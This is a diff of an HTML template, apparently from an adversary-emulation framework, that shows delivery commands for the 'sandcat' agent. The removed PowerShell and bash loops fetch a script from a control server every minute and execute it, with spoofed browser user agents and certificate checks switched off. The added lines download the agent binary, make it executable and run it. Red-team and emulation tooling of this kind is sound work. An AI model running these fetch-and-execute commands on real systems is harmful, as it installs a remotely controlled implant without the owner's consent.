@@ -46,8 +46,8 @@
                             </p>
                             <br>
                             <div>
-                                <pre id="pshDelivery">while($true) {$ErrorActionPreference='SilentlyContinue';$url="https://localhost:8888/file/render"; $ps_table = $PSVersionTable.PSVersion;If([double]$ps_table.Major -ge 6){iex (irm -Method Post -Uri $url -Headers @{"file"="54ndc47.ps1"} -UserAgent ([Microsoft.PowerShell.Commands.PSUserAgent]::Chrome) -SkipCertificateCheck);}else{$web=New-Object -ComObject MSXML2.ServerXMLHTTP; $web.setOption(2,13056);$web.open("POST", $url, $false); $web.setRequestHeader("file","54ndc47.ps1");$web.setRequestHeader("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"); $web.Send(); $resp = $web.ResponseText();iex($resp);};sleep 60}</pre>
-                                <pre id="bashDelivery">while true; do eval "$(curl --noproxy localhost -sk -X POST -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.89 Safari/537.36" -H "file:54ndc47.sh" https://localhost:8888/file/render)"; sleep 60; done</pre>
+                                <pre id="pshDelivery">while($true) {[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$True}; $url="https://localhost:8888/file/download"; $wc=New-Object System.Net.WebClient;$wc.Headers.add("file","sandcat.exe"); $output="C:\Users\Public\sandcat.exe"; $wc.DownloadFile($url,$output); C:\Users\Public\sandcat.exe https://localhost:8888 my_group; sleep 60}</pre>
+                                <pre id="bashDelivery">while true; do curl -sk -X POST -H 'file:sandcat-osx' https://localhost:8888/file/download > /tmp/sandcat-osx && chmod +x /tmp/sandcat-osx && /tmp/sandcat-osx https://localhost:8888 my_group; sleep 60; done</pre>
                             </div>
                         </div>
                     </center>
